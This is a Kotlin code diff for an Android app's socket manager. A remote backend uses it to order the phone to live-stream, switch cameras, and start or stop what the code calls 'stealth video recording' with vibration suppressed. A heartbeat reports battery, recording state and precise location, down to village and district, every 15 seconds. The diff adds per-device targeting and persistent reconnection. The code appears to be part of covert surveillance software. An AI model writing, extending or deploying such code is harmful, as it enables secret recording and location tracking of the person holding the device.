@@ -28,14 +28,20 @@ object SocketManager {
         val prefs = AppPreferences(context)
         val serverUrl = prefs.serverUrl.trimEnd('/')
 
-        // If connected to same server, nothing to do
-        if (socket?.connected() == true && currentServerUrl == serverUrl) {
-            return
-        }
-
-        // If connecting to same server already, wait
-        if (isConnecting && currentServerUrl == serverUrl) {
-            return
+        val s = socket
+        if (s != null && currentServerUrl == serverUrl) {
+            if (s.connected()) {
+                registerDevice(context)
+                startHeartbeat(context)
+                return
+            } else {
+                try {
+                    s.connect()
+                    return
+                } catch (e: Exception) {
+                    Log.w(TAG, "Socket reconnect attempt error: ${e.message}")
+                }
+            }
         }
 
         try {
@@ -55,25 +61,31 @@ object SocketManager {
             val options = IO.Options().apply {
                 reconnection = true
                 reconnectionAttempts = Int.MAX_VALUE
-                reconnectionDelay = 1500
-                reconnectionDelayMax = 10000
+                reconnectionDelay = 1000
+                reconnectionDelayMax = 5000
                 timeout = 15000
                 transports = arrayOf("websocket", "polling")
             }
 
             socket = IO.socket(URI.create(serverUrl), options)
 
-            socket?.on(Socket.EVENT_CONNECT) {
+            val onConnectedAction = {
                 isConnecting = false
                 Log.i(TAG, " Connected to central backend socket at $serverUrl!")
                 registerDevice(context)
                 startHeartbeat(context)
             }
 
+            socket?.on(Socket.EVENT_CONNECT) {
+                onConnectedAction()
+            }
+
+            socket?.on("reconnect") {
+                onConnectedAction()
+            }
+
             socket?.on(Socket.EVENT_DISCONNECT) {
                 isConnecting = false
-                heartbeatThread?.interrupt()
-                heartbeatThread = null
                 Log.w(TAG, " Disconnected from backend socket")
             }
 
@@ -86,6 +98,11 @@ object SocketManager {
             socket?.on("start-live-stream") { args ->
                 try {
                     val data = args.firstOrNull() as? JSONObject
+                    val targetDeviceId = data?.optString("deviceId")
+                    val myDeviceId = BackendClient.getDeviceId(context)
+                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
+                        return@on
+                    }
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     Log.i(TAG, " Received START live stream command (Lens: $camera)")
                     if (!CameraRecordingService.isServiceRunning) {
@@ -99,15 +116,30 @@ object SocketManager {
             }
 
             // Command 2: Stop live stream
-            socket?.on("stop-live-stream") {
-                Log.i(TAG, " Received STOP live stream command")
-                LiveStreamService.stopService(context)
+            socket?.on("stop-live-stream") { args ->
+                try {
+                    val data = args.firstOrNull() as? JSONObject
+                    val targetDeviceId = data?.optString("deviceId")
+                    val myDeviceId = BackendClient.getDeviceId(context)
+                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
+                        return@on
+                    }
+                    Log.i(TAG, " Received STOP live stream command")
+                    LiveStreamService.stopService(context)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error handling stop-live-stream", e)
+                }
             }
 
             // Command 3: Switch camera (FRONT <-> BACK)
             socket?.on("switch-camera") { args ->
                 try {
                     val data = args.firstOrNull() as? JSONObject
+                    val targetDeviceId = data?.optString("deviceId")
+                    val myDeviceId = BackendClient.getDeviceId(context)
+                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
+                        return@on
+                    }
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     Log.i(TAG, " Received SWITCH camera command: $camera")
                     LiveStreamService.switchCamera(context, camera)
@@ -119,13 +151,13 @@ object SocketManager {
             // Command 4: Remote start stealth video recording
             socket?.on("start-remote-recording") { args ->
                 try {
-                    val camera = if (args.isNotEmpty() && args[0] is JSONObject) {
-                        (args[0] as JSONObject).optString("camera", "BACK")
-                    } else if (args.isNotEmpty() && args[0] is String) {
-                        args[0] as String
-                    } else {
-                        "BACK"
+                    val data = args.firstOrNull() as? JSONObject
+                    val targetDeviceId = data?.optString("deviceId")
+                    val myDeviceId = BackendClient.getDeviceId(context)
+                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
+                        return@on
                     }
+                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                     val lens = if (camera.equals("FRONT", ignoreCase = true)) "FRONT" else "BACK"
                     prefs.cameraLens = lens
                     Log.i(TAG, "📡 Received REMOTE START recording command with lens: $lens (#1 Top Priority)")
@@ -150,8 +182,14 @@ object SocketManager {
             }
 
             // Command 5: Remote stop stealth video recording
-            socket?.on("stop-remote-recording") {
+            socket?.on("stop-remote-recording") { args ->
                 try {
+                    val data = args.firstOrNull() as? JSONObject
+                    val targetDeviceId = data?.optString("deviceId")
+                    val myDeviceId = BackendClient.getDeviceId(context)
+                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
+                        return@on
+                    }
                     Log.i(TAG, " Received REMOTE STOP recording command")
                     CameraRecordingService.stopService(context, enableVibration = false)
                 } catch (e: Exception) {
@@ -160,6 +198,7 @@ object SocketManager {
             }
 
             socket?.connect()
+            startHeartbeat(context)
         } catch (e: Exception) {
             isConnecting = false
             Log.e(TAG, "Socket init error", e)
@@ -171,10 +210,13 @@ object SocketManager {
      */
     fun reconnect(context: Context) {
         try {
-            if (socket?.connected() != true) {
-                socket?.connect() ?: initAndConnect(context)
-            } else {
+            val s = socket
+            if (s != null && s.connected()) {
                 registerDevice(context)
+            } else if (s != null) {
+                s.connect()
+            } else {
+                initAndConnect(context)
             }
         } catch (e: Exception) {
             Log.e(TAG, "Reconnect error", e)
@@ -183,29 +225,41 @@ object SocketManager {
     }
 
     private fun startHeartbeat(context: Context) {
-        heartbeatThread?.interrupt()
+        if (heartbeatThread != null && heartbeatThread?.isAlive == true) {
+            return
+        }
         heartbeatThread = Thread {
             try {
                 val prefs = AppPreferences(context)
-                while (!Thread.currentThread().isInterrupted && socket?.connected() == true) {
-                    val battery = BackendClient.getBatteryLevel(context)
-                    val loc = BackendClient.getLocation(context)
+                while (!Thread.currentThread().isInterrupted) {
+                    try {
+                        val s = socket
+                        if (s != null && s.connected()) {
+                            val battery = BackendClient.getBatteryLevel(context)
+                            val loc = BackendClient.getLocation(context)
 
-                    val payload = JSONObject().apply {
-                        put("deviceId", BackendClient.getDeviceId(context))
-                        put("batteryLevel", battery)
-                        put("isRecording", prefs.isRecording)
-                        put("timestamp", System.currentTimeMillis())
-                        if (loc != null) {
-                            put("latitude", loc.latitude)
-                            put("longitude", loc.longitude)
-                            put("locationName", loc.address)
-                            put("villageOrPara", loc.villageOrPara)
-                            put("districtAndCountry", loc.districtAndCountry)
+                            val payload = JSONObject().apply {
+                                put("deviceId", BackendClient.getDeviceId(context))
+                                put("deviceName", BackendClient.getDeviceName())
+                                put("batteryLevel", battery)
+                                put("isRecording", prefs.isRecording)
+                                put("timestamp", System.currentTimeMillis())
+                                if (loc != null) {
+                                    put("latitude", loc.latitude)
+                                    put("longitude", loc.longitude)
+                                    put("locationName", loc.address)
+                                    put("villageOrPara", loc.villageOrPara)
+                                    put("districtAndCountry", loc.districtAndCountry)
+                                }
+                            }
+                            s.emit("device-heartbeat", payload)
+                        } else {
+                            socket?.connect()
                         }
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Heartbeat cycle error: ${e.message}")
                     }
-                    socket?.emit("device-heartbeat", payload)
-                    Thread.sleep(20000)
+                    Thread.sleep(15000)
                 }
             } catch (e: InterruptedException) {
                 // Thread interrupted
